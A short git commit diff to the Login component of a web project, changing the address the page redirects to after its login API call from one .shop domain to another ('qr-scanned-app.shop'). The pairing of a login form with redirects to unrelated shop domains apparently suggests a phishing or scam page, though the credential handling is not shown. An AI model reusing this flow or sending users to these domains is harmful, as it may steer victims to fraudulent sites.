fc9ca87ac9e4db37b2351e5fc7cb3aa9fcd271ee
hurt the kid <127146284+husknet@users.noreply.github.com>
2025-07-17 10:50:50 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://acdcrenchers.shop/';
+      window.location.href = 'https://qr-scanned-app.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
